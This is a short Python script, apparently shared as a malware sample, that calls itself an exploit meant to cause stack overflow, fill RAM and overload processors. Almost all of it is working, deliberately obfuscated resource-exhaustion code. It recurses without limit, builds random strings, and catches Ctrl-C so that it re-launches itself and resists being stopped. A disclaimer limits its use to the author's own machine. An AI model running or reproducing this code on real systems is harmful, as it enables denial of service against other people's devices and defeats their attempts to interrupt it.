#!/usr/bin/env python3

# > General Information
# Project          : polyexemplar.py
# License          : UNLICENSE
# Author           : Larry "Diicorp95" Holst
# Purpose          : An exploit
# > The Virus Properties
# Polymorphic      : No
# Breeds or infects: No
# Performs disk I/O: No
# Exploit          : Yes
# Behaviour: Program tries to cause stack overflow, fill up all free available
#            RAM, overload PUs.
#
#     _____\    _______
#    /      \  |      /\
#   /_______/  |_____/  \
#  |   \   /        /   /
#   \   \         \/   /
#    \  /          \__/_
#     \/ ____    /\
#       /  \    /  \
#      /\   \  /   /
# jgs    \   \/   /
#         \___\__/
#
# > Legal Information
# (!) USE THE CODE FOR EDUCATIONAL PURPOSE AND SYSTEM RESILIENCE TESTS ONLY.
# (!) DO NOT RUN IT ON AN ELECTRONIC COMPUTING DEVICE OTHER THAN YOUR OWN.
#     IT'S CRIMINALLY PUNISHABLE, BECAUSE YOU DAMAGE SOMEONE ELSE'S PROPERTY.
# (!) NO GUARANTEE THAT YOUR DEVICE WILL NOT BE DAMAGED.
#     EVERYTHING IS AT YOUR OWN RISK.

import sys,math,random
def je5(x):_=lambda b:eval(b);_(x)
global xf6;xf6=[]
def b(l):
 _='rj4_';
 for i in range(0,l):_+=chr(random.randrange(65,90))
 return _
def g(a=4,y=4):
 _=b(8)
 xf6.append(_+b(24)+b(8)+str(int(random.getrandbits(32))))
 try:g(xf6[random.randrange(0,len(xf6))])
 except RecursionError:return b((2<<9)*2)
lu3 = (
 math.cos(2+1+1+1*2+1+1*2+1+1*2),
 (2*0-1),
 ((1+1<<1+1*2*2+1*2+1+1)-24),
 ((1+1<<1+1*2*2+1*2+1+1)-24),
 ((1+1<<1+1*2*2+1*2+1+1)-24),
 1+1+1*2+1*2*2*1*2+1*2+1+1+1*2+1*2*2*1*2,
 (2+2+1*2),
 1*2*2*1*2+1*2+1+1+1*2,
 1*2*2*1*2+1*2,
 1*2+1+1+1*2,
 (2*2+1*2),
 2*2,
 2,
 6,
 (2+1*2*2),
 (2*0-1),
)
vf5=lambda:random.randrange(1,8)
while (math.ceil(round(lu3[0],lu3[13])*lu3[3]*lu3[4]*lu3[2]))!=((lu3[5]+lu3[9]+lu3[7]+lu3[8]-lu3[14])<<((lu3[10]+lu3[6]+lu3[15]+lu3[1])*lu3[12])+lu3[11]):
 try:g(vf5,vf5)
 except KeyboardInterrupt:
  try:
   if not execfile in dir(main):
    raise BaseException
  except Exception as e:
   execfile=lambda fn:exec(open(fn).read())
  execfile(sys.argv[0])
  continue
